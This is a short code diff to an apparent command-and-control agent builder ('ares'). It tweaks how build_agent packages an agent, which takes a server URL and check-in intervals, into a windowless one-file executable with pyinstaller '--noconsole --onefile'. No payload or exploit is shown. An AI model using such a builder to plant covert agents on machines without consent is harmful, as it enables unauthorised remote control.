@@ -1,4 +1,6 @@
 #!/usr/bin/env python2
+#!~/Documents/scripts/ares/venv/bin/python
+
 
 import os
 import shutil
@@ -36,7 +38,9 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         agent_file = os.path.join(working_dir, 'dist', prog_name)
     elif platform == 'windows':
         if os.name == 'posix':
-            os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            #os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            exit()
         else:
             os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
         if not prog_name.endswith(".exe"):
